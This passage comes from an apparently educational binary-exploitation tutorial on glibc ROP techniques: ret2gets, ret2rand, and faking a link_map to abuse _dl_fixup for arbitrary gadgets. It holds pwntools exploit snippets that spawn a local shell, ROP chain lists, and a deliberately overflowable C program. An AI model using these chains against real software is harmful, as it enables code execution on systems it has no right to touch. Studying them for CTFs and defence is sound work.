style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> gen_payload</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">rop</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> rbp</span><span class="token operator" style="color:#393A34">+</span><span class="token number" style="color:#36acaa">8</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">assert</span><span class="token plain"> </span><span class="token builtin">len</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">payload</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&lt;=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x200</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">send</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">payload</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">ljust</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0x200</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;\x00&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># trigger ret2gets</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sendline</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">b&quot;&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sendline</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">b&quot;/bin&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> p8</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">u8</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">b&quot;/&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">+</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;sh&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">interactive</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="alternative-payloads">Alternative payloads<a href="#alternative-payloads" class="hash-link" aria-label="Direct link to Alternative payloads" title="Direct link to Alternative payloads">​</a></h3>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="general-ret2gets">General ret2gets<a href="#general-ret2gets" class="hash-link" aria-label="Direct link to General ret2gets" title="Direct link to General ret2gets">​</a></h4>
<p>For this program we specifically used the fact that <code>rdi = 0</code>, however there&#x27;s a more <a href="/pwn/rop-2.34+/ret2gets#rand">general payload that uses rand</a> (since <code>rand</code> takes no arguments, thus has no <code>rdi</code> constraints):</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">rop </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token string" style="color:#e3116c">&quot;rand&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">    </span><span class="token comment" style="color:#999988;font-style:italic"># -&gt; unsafe_state</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token string" style="color:#e3116c">&quot;gets&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token string" style="color:#e3116c">&quot;gets&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token string" style="color:#e3116c">&quot;system&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">]</span><br></span></code></pre></div></div>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="ret2rand">ret2rand<a href="#ret2rand" class="hash-link" aria-label="Direct link to ret2rand" title="Direct link to ret2rand">​</a></h4>
<p>In fact, <code>rand</code> can be more versatile than just this, and could use it to store our <code>/bin/sh</code> string (see more <a href="/pwn/fork_gadget#ret2rand">here</a>):</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">rop </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token string" style="color:#e3116c">&quot;rand&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token string" style="color:#e3116c">&quot;gets&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token string" style="color:#e3116c">&quot;rand&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token string" style="color:#e3116c">&quot;system&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">extra_data </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> flat</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;/bin/sh\x00&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token number" style="color:#36acaa">0x10</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x404008</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">    </span><span class="token comment" style="color:#999988;font-style:italic"># writable address</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token number" style="color:#36acaa">0x18</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> p32</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">      </span><span class="token comment" style="color:#999988;font-style:italic"># TYPE_0</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sendline</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">extra_data</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre></div></div>
<p>In fact, the benefit of using this is we&#x27;re less limited in our writes (for ret2gets, the <code>lock.owner</code> needs to be <code>THREAD_SELF</code>), so we can even use <a href="/pwn/setcontext">setcontext</a>.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="arbitrary-rop-chains">Arbitrary rop chains<a href="#arbitrary-rop-chains" class="hash-link" aria-label="Direct link to Arbitrary rop chains" title="Direct link to Arbitrary rop chains">​</a></h2>
<p>It&#x27;s all well and good to be able to rop just calling well defined functions, however, what if we were able to force it to resolve <em>arbitrary</em> addresses?</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="attack-scenario">Attack scenario<a href="#attack-scenario" class="hash-link" aria-label="Direct link to Attack scenario" title="Direct link to Attack scenario">​</a></h3>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">vuln.c</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property directive keyword" style="color:#00009f">include</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property string" style="color:#e3116c">&lt;unistd.h&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">main</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> buf</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">0x80</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">read</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> buf</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x1337</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre></div></div>
<p>Similar setup as before, but instead with a bigger size, which we&#x27;ll need for later.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="deadend-with-r_addend">Deadend with r_addend<a href="#deadend-with-r_addend" class="hash-link" aria-label="Direct link to Deadend with r_addend" title="Direct link to Deadend with r_addend">​</a></h3>
<p>Getting arbitrary gadgets isn&#x27;t really possible when using the existing link map, as it has a set list of symbols that you&#x27;re restricted to. One idea you might have is to use the <code>r_addend</code> field of your relocation object, which is theoretically added onto the resolved value:</p>
<figure><img src="/assets/image (232).png" alt=""><figcaption><p><a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/elf/dl-runtime.c#L121">Adding r_addend</a></p></figcaption></figure>
<figure><img src="/assets/image (234).png" alt=""><figcaption><p><a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/sysdeps/sh/dl-machine.h#L245"><a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/sysdeps/sh/dl-machine.h#L245" target="_blank" rel="noopener noreferrer">https://elixir.bootlin.com/glibc/glibc-2.35/source/sysdeps/sh/dl-machine.h#L245</a></a></p></figcaption></figure>
<p>The idea here would be that you&#x27;d have some symbol you&#x27;d resolve, then you can add offsets to the symbol address to produce addresses pointing to arbitrary gadgets.</p>
<p>However, the implementation of <a href="https://elixir.bootlin.com/glibc/glibc-2.35/C/ident/elf_machine_plt_value" target="_blank" rel="noopener noreferrer">elf_machine_plt_value</a> is architecture specific, so some architectures don&#x27;t use the <code>r_addend</code> at all. Unfortunately, <a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/sysdeps/x86_64/dl-machine.h#L235" target="_blank" rel="noopener noreferrer">x86-64</a> is one of these:</p>
<figure><img src="/assets/image (233).png" alt=""><figcaption></figcaption></figure>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="faking-link-maps">Faking link maps<a href="#faking-link-maps" class="hash-link" aria-label="Direct link to Faking link maps" title="Direct link to Faking link maps">​</a></h3>
<p>So if the link map won&#x27;t give us the gadgets we want, what if we instead made our own link map! This could allow us to define a symbol table where each entry can be a function <em>or</em> a gadget, then we&#x27;d resolve each gadget when we wanted to use them.</p>
<p>For this to work, we&#x27;d need to populate <code>l-&gt;l_addr</code> with a libc address. Normally this would be the base of the library, however any address in libc would work (as long as it&#x27;s a static offset from the base), as we could just offset from this address to everything else.</p>
<p>The problem is obviously we don&#x27;t know any, otherwise we would just rop normally. Instead, we can use an <em>existing</em> libc address, such as a GOT entry.</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">struct</span><span class="token plain"> </span><span class="token class-name">link_map</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">ElfW</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">Addr</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> l_addr</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain">l_name</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">ElfW</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">Dyn</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain">l_ld</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre></div></div>
<p>Conveniently <a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/include/link.h#L100" target="_blank" rel="noopener noreferrer">l-&gt;l_addr</a> is the first field of the link map, so we can just write the rest of the link map directly after some GOT entry, then use the address of said GOT entry as the address of the link map.</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">            |----------------|</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x404000    |    puts@GOT    |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            |----------------|</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x404008    |    read@GOT    |    &lt;--- l_addr</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            |----------------|</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x404010    |    AAAAAAAA    |    &lt;--- l_name (start of data)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            |----------------|</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x404018    |    BBBBBBBB    |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            |----------------|</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x404020    |      ...       |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            |----------------|</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="revisiting-_dl_fixup">Revisiting _dl_fixup<a href="#revisiting-_dl_fixup" class="hash-link" aria-label="Direct link to Revisiting _dl_fixup" title="Direct link to Revisiting _dl_fixup">​</a></h3>
<p>Let&#x27;s once again walk through <a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/elf/dl-runtime.c#L41" target="_blank" rel="noopener noreferrer">_dl_fixup</a>, this time making note of the fields we&#x27;ll need to fake for our own link map.</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="the-tables">The tables<a href="#the-tables" class="hash-link" aria-label="Direct link to The tables" title="Direct link to The tables">​</a></h4>
<figure><img src="/assets/Screenshot 2025-07-22 230859.png" alt=""><figcaption></figcaption></figure>
<p>Recall that to lookup a symbol, we need to find:</p>
<ul>
<li>The symbol entry in <code>DT_SYMTAB</code></li>
<li>The string name in <code>DT_STRTAB</code></li>
<li>The relocation entry in <code>DT_JMPREL</code></li>
</ul>
<p>So these need to be present. Slightly annoyingly, these point to dynamic table entries, rather than the tables themselves:</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">typedef</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">struct</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  Elf64_Sxword	d_tag</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain">			</span><span class="token comment" style="color:#999988;font-style:italic">/* Dynamic entry type */</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">union</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      Elf64_Xword d_val</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain">		</span><span class="token comment" style="color:#999988;font-style:italic">/* Integer value */</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      Elf64_Addr d_ptr</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain">			</span><span class="token comment" style="color:#999988;font-style:italic">/* Address value */</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"> d_un</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"> Elf64_Dyn</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre></div></div>
<p>The <code>d_tag</code> just contains a number for the type of entry, which isn&#x27;t checked by <code>_dl_fixup</code>, so we can ignore this. We&#x27;re interested in <code>d_ptr</code>/<code>d_val</code> (these refer to the same memory slot, due to the <code>union</code>). So in summary, if <code>l_info[...] = ptr</code>, then <code>*(ptr + 8)</code> points to the table.</p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>info</div><div class="admonitionContent_BuS1"><p>The <code>DT_PLTGOT</code> ends up being unused. Normally this would be used to point to the GOT table itself, but since the relocation entries store an address of where their entry should go (<code>r_offset</code>), this isn&#x27;t needed.</p><p>And even though it&#x27;s referenced in the code, it gets optimized out. The only usage of <code>pltgot</code> is <code>reloc_offset (pltgot, reloc_arg)</code>, and we find that <code>reloc_offset</code> is defined as:</p><div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">https://elixir.bootlin.com/glibc/glibc-2.35/source/sysdeps/x86_64/dl-runtime.h#L26</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">static</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">inline</span><span class="token plain"> </span><span class="token class-name">uintptr_t</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">reloc_offset</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token class-name">uintptr_t</span><span class="token plain"> plt0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token class-name">uintptr_t</span><span class="token plain"> pltn</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> pltn </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">sizeof</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token function" style="color:#d73a49">ElfW</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">Rela</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre></div></div><p>This function will be inlined, and since the first argument is unused, <code>pltgot</code> is completely useless, and thus the compiler won&#x27;t bother.</p></div></div>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="l_ld_readonly">l_ld_readonly<a href="#l_ld_readonly" class="hash-link" aria-label="Direct link to l_ld_readonly" title="Direct link to l_ld_readonly">​</a></h4>
<p>An extra snag with the tables is with how they&#x27;re accessed using <code>D_PTR</code>:</p>
<figure><img src="/assets/image.png" alt=""><figcaption><p><a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/sysdeps/generic/ldsodefs.h#L89"><a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/sysdeps/generic/ldsodefs.h#L89" target="_blank" rel="noopener noreferrer">https://elixir.bootlin.com/glibc/glibc-2.35/source/sysdeps/generic/ldsodefs.h#L89</a></a></p></figcaption></figure>
<p>Basically they have the option of being rebased if it&#x27;s deemed read-only. This would cause the table pointer to get rebased with a libc address, and since we want these to point into the binary&#x27;s memory, we&#x27;ll need to set <code>l-&gt;ld_readonly = 0</code>.</p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>info</div><div class="admonitionContent_BuS1"><p><a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/sysdeps/generic/dl-relocate-ld.h#L23" target="_blank" rel="noopener noreferrer">DL_RO_DYN_SECTION</a> is defined as <code>0</code> on most architectures, so this is enough.</p></div></div>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="st_other">st_other<a href="#st_other" class="hash-link" aria-label="Direct link to st_other" title="Direct link to st_other">​</a></h4>
<figure><img src="/assets/image (11).png" alt=""><figcaption></figcaption></figure>
<p>Once it finds the tables, we have a choice of whether  <code>sym-&gt;st_other</code> should be <code>STV_DEFAULT=0</code> or not. The default case, is <code>sym-&gt;st_other == 0</code>, where it will look up the symbol. This is doable, but unnecessariy complex for what we need, as this involves many structures and fields to be set up, such as hash tables.</p>
<p>Instead, let&#x27;s look at when <code>sym-&gt;st_other !=  0</code>:</p>
<figure><img src="/assets/image (12).png" alt=""><figcaption><p><a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/elf/dl-runtime.c#L116"><a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/elf/dl-runtime.c#L116" target="_blank" rel="noopener noreferrer">https://elixir.bootlin.com/glibc/glibc-2.35/source/elf/dl-runtime.c#L116</a></a></p></figcaption></figure>
<p>This looks much easier, and after parsing the mcros, we find that all this does is simply rebase the existing <code>sym-&gt;st_value</code> with <code>l-&gt;l_addr</code>!</p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>info</div><div class="admonitionContent_BuS1"><p>The reason this path exists is because of <a href="https://docs.oracle.com/cd/E19683-01/816-1386/chapter6-79797/index.html" target="_blank" rel="noopener noreferrer">STV_PROTECTED</a> symbols. These are essentially symbols that, when they&#x27;re resolved from within the same binary they were defined, they must come from said binary. So all that&#x27;s needed to resolve the symbol is to rebase it.</p></div></div>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="stt_gnu_ifunc">STT_GNU_IFUNC<a href="#stt_gnu_ifunc" class="hash-link" aria-label="Direct link to STT_GNU_IFUNC" title="Direct link to STT_GNU_IFUNC">​</a></h4>
<figure><img src="/assets/image (13).png" alt=""><figcaption><p><a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/elf/dl-runtime.c#L123"><a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/elf/dl-runtime.c#L123" target="_blank" rel="noopener noreferrer">https://elixir.bootlin.com/glibc/glibc-2.35/source/elf/dl-runtime.c#L123</a></a></p></figcaption></figure>
<p>We want to avoid hitting this condition. <a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/elf/elf.h#L603" target="_blank" rel="noopener noreferrer">STT_GNU_IFUNC</a> is for ifuncs, which are called to return the actual address of the function that should be called. String functions like <code>memset</code>, <code>memcpy</code> etc. will use these to select the most optimized one for your system during runtime (based on cpu features).</p>
<p>If one had a function which could be used to return arbitrary addresses, like a <code>read_int</code> function you may see in CTFs, then you could actually get arbitrary gadgets like that.</p>
<p>Alas, since we don&#x27;t have that, we&#x27;ll be ignoring it, so ensure that <code>st_info &amp; 0xf != 10</code>.</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="l_reloc_result">l_reloc_result<a href="#l_reloc_result" class="hash-link" aria-label="Direct link to l_reloc_result" title="Direct link to l_reloc_result">​</a></h4>
<figure><img src="/assets/image (14).png" alt=""><figcaption><p><a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/elf/dl-runtime.c#L133"><a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/elf/dl-runtime.c#L133" target="_blank" rel="noopener noreferrer">https://elixir.bootlin.com/glibc/glibc-2.35/source/elf/dl-runtime.c#L133</a></a></p></figcaption></figure>
